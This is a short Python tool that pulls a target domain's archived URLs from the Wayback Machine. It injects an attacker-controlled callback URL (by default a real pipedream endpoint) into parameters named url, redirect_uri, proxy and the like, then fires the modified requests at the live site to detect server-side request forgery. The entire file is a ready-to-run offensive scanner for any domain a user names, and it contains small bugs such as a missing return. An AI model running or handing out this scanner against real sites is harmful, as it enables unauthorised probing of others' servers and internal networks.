"""
tool that use wayback machine, to find hidden ssrf query params, and check if those params are vulnerable,
you can add your specific query params,
you need to configure a specific domain that return a response true in json, so that this will make the tool detect ssrf, 
i suggest use pipedream from requestbin
"""

import requests
import re
from urllib.parse import urlparse, urlencode, urlunparse, parse_qs
import argparse

def get_wayback_urls(domain, pastbin_url):
    url = f"https://web.archive.org/cdx/search/cdx?url={domain}/*&output=json"
    response = requests.get(url)
    vulnerable_query_strings = ["url", "link", "redirect_url", "redirect_uri", "next", "out", 
    "view", "file", "path", "img_url", "go", "to", "dir", "domain", "host", "target",
    "address", "page", "uri", "endpoint", "domain", "proxy", "proxy_url", "u", "redirecturl", 
    "redirecturi", "image_url", "imageurl", "imgurl", "proxyurl"]

    if response.status_code == 200:
        urls = []
        for result in response.json():

            parsed_url = urlparse(result[2])
            query_params = parse_qs(parsed_url.query)
            for key in query_params.keys():
                for q in vulnerable_query_strings:
                    if q == key.lower():
                        query_params[key] = [str(pastbin_url)]
                        encoded_query_params = urlencode(query_params, doseq=True)
                        updated_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, encoded_query_params, parsed_url.fragment))
                        urls.append(updated_url)
        return urls
    else:
        return None

def check_ssrf(url, payload=True):
    response = requests.get(url)
    if response.status_code == 200:
        try:
            data = response.json()
            if data["payload"] == payload:
                return True
        except:
            return False
        
    else :
        False


parser = argparse.ArgumentParser(description='Tool that helps identify hidden ssrf using waybackmachine')
parser.add_argument('--domain', type=str, metavar='DOMAIN', required=True,
                    help='domain to check for ssrf')
parser.add_argument('--pastbin', type=str, metavar='PASTBIN_URL', required=True, default="https://eoms79r71abki9y.m.pipedream.net",
                    help='pastbin url to use for checking')

args = parser.parse_args()

domain = args.domain
pastbin_url = args.pastbin

urls = get_wayback_urls(domain, pastbin_url)


for url in urls:
    if check_ssrf(url):
        print(url)
